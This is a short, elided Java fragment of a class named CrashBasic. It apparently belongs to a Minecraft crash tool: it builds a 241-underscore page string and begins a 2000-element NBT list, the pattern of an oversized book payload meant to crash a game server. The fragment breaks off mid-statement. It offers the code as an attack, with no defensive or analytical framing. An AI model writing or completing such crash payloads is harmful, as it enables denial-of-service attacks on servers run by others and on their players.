...
public class CrashBasic extends Crash {

    public CrashBasic() {
        super("basic",CrashType.NBT);
    }
    ...
    public void init() {
        ...
        IntStream.range(0,241).forEach(i -> pageContent.set(pageContent.get() + "_"));

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 2000)
